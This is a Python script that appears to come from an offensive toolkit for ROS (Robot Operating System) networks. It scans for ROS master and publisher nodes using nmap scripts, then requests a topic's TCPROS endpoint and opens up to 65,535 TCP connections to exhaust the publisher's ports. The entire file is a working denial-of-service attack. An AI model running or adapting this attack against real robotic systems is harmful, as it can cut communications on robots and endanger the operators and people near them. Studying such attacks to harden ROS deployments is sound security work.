import socket
import sys

from core import Node
from recon import scan_node


def port_exhaust(target_node: Node, node_name: str):
    """
    Repeatedly open TCPROS connections to exhaust all of the ports
    :param target_node: Node to perform the attack against
    :param node_name: Name to give the system
    :return:
    """
    print(target_node.notes)
    print(target_node.ip_addr)
    node.get_pub_list(node_name)
    # TODO: Optionally target one topic
    if len(node.pub_topics) > 0:
        target_topic = node.pub_topics[0]
        (_, _, port_info) = target_node.server.requestTopic(node_name, target_topic.name, [[target_topic.protocol]])
        (_, ip_addr, port) = port_info
        # To make sure we don't exhaust our ports first
        if sys.platform.startswith('linux'):
            import resource  # module fails importing on Windows
            soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
            limit = max(soft, hard)
            resource.setrlimit(resource.RLIMIT_NOFILE, (limit, hard))
        s_list = []
        try:
            for i in range(65535):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip_addr, port))
                s_list.append(s)
        except Exception as e:
            print(e)
        print(len(s_list))


if __name__ == "__main__":
    node_list = scan_node.scan_host('127.0.0.1', '1-', ['ros-master-scan.nse', 'ros-node-id.nse'])
    for node in node_list:
        if "Publisher" in node.notes:
            target = node
            port_exhaust(target, "/port_exhaust")
